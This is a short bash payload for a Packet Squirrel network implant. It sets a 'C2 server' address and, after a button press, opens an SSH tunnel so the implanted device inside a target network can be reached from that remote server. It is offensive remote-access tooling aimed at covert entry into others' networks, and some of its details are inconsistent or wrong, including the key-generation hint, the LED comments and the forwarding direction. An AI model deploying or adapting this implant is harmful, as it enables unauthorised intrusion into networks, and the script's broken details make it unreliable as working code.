#!/bin/bash
# Title: SSH Remote Management Tool for Packet Squirrel
# Description: Makes packet Squirrel directly accessible via SSH on a remote server
# Author: BlackPropaganda
# Version: 0.1
# Category: Remote-Access
# Net Mode: NAT
# Firmware: 1.2
#
#
# LED State Descriptions
# Magenta Solid - SSH connecting
# Amber Blink 5 Times - Waiting for user button press
#

# C2 Server address, port and tunnel port
c2_server="192.168.1.123"
c2_port=22
c2_tunnel_port=2222
tunnel_user="username"
# no pass needed, headless mode required so RSA key file is used.
# generate in this directory with: 'ssh -t rsa -b 2048 -f id_rsa'

# we need an IP, so it'll have to be NAT, unless implanted inline.
NETMODE NAT

# amber blinking for button press to launch SSH connection.
LED A BLINK
# waiting for button press to start SSH connection.
BUTTON
# Green indicates SSH connection has been launched and the server should have received the connection.
LED M SOLID

# -L indicates local port forwarding which tunnels connections to localhost on server to client.
# Once complete, connect to remote SSH server and connect to the squirrel by connecting to localhost at
# the tunnel port specified on the server to reach the Squirrel.

# todo: push SSH connection to background to support button kill switch, create optional SSH connection keep-alive.
ssh -L 22:127.0.0.1:$c2_tunnel_port -i id_rsa -p $c2_port $tunnel_user@$c2_server &

# SSH connection failed, target network may be hardened.
LED R
NETMODE OFF